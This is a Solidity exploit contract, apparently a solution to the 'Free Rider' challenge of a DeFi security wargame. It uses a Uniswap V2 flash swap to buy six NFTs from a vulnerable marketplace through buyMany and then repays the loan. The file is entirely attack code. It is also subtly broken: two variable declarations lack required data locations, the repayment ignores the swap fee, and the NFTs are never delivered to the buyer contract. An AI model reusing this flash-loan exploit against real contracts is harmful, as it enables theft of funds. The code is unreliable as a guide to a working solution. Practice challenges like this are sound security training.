// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../WETH9.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract AttackFreeRider {
    WETH9 private weth;
    DamnValuableNFT private dvNFT;

    IUniswapV2Pair private uniswapPair;
    FreeRiderNFTMarketplace private nftMarketPlate;
    FreeRiderBuyer private nftBuyer;

    constructor(
        address _weth,
        address _dvNFT,
        address _uniswapPair,
        address _nftMarketPlate,
        address _nftBuyer
    ) {
        weth = WETH9(_weth);
        dvNFT = DamnValuableNFT(_dvNFT);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        nftMarketPlate = FreeRiderNFTMarketplace(_nftMarketPlate);
        nftBuyer = FreeRiderBuyer(_nftBuyer);
    }

    receive() external payable {}

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes _data
    ) external returns (bytes4) {
        return
            bytes4(
                keccak256("onERC721Received(address,address,uint256,bytes)")
            );
    }

    function attack(uint256 _amount) external {
        //Initiate flash swap to get WETH
        uniswapPair.swap(_amount, 0, address(this), new bytes(1));
    }

    //Called during flash swap
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        //Swap loaned WETH to ETH
        weth.withdraw(amount0);

        //Buy NFTs with ETH
        uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
        nftMarketPlate.buyMany{value: address(this).balance}(tokenIds);

        //Swap ETH back to WETH
        weth.deposit{value: address(this).balance}();

        //Pay back flash swap
        weth.transfer(address(uniswapPair), weth.balanceOf(address(this)));
    }
}
